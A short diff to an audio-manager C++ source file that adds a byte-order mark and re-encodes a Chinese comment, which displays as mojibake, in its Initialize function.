@@ -1,4 +1,4 @@
-// AudioManager.cpp: implementation of the CAudioManager class.
+ï»¿// AudioManager.cpp: implementation of the CAudioManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -63,7 +63,7 @@ bool CAudioManager::Initialize()
 	if (!waveInGetNumDevs())
 		return false;
 	
-	// ÕıÔÚÊ¹ÓÃÖĞ.. ·ÀÖ¹ÖØ¸´Ê¹ÓÃ
+	// æ­£åœ¨ä½¿ç”¨ä¸­.. é˜²æ­¢é‡å¤ä½¿ç”¨
 // 	if (m_bAudioIsWorking)
 // 		return false;
 	
